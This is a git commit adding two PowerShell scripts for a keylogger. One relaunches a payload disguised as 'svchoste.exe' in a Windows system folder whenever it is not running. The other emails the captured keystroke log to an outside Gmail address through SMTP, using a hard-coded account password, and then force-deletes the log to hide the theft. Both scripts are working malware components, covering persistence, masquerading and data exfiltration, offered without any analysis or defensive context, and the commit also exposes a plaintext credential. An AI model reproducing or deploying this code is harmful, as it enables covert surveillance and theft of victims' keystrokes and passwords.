5f739afc0ccad176ff12aef904848c1d4aaebab3
Hilan Meyran <67104154+ShawnHeyli@users.noreply.github.com>
2021-06-28 09:46:00 +0200

    Add files via upload

---
+++ Checker-Keylogger.ps1
@@ -0,0 +1,6 @@
+﻿$FolderPath = "C:\Windows\PLA\Exceptions\" #Emplacement du payload
+$FileName = "svchoste.exe" #Nom du fichier
+
+if(!(Get-Process "svchoste" -ErrorAction SilentlyContinue)){
+    start-process -filepath $FolderPath$FileName
+}
---
+++ SendMail-Keylogger.ps1
@@ -0,0 +1,22 @@
+﻿$FolderPath = "C:\Windows\PLA\Exceptions\" #Emplacement du payload
+$PayloadName = "cGF5ZGF5.txt" # Payday en base6
+
+$Username = "shawnheyli@gmail.com"
+$EmailPassword = "NouKakTiMalaya"
+$Attachment = "$FolderPath$PayloadName"
+$EmailTo = "shawnheyli@gmail.com"
+$EmailFrom = "shawnheyli@gmail.com"
+$Subject = "DuckeyZagna"
+$Body = "Quack, Quack !!"
+$SMTPServer = "smtp.gmail.com"
+$SMTPMessage = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
+$Attachment = New-Object Net.Mail.Attachment($Attachment)
+$SMTPMessage.Attachments.Add($Attachment)
+$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPClient.EnableSsl = $true
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword)
+$SMTPClient.Send($SMTPMessage)
+
+$Attachment.Dispose()
+
+Remove-Item -Path $FolderPath$PayloadName -Force -Recurse 
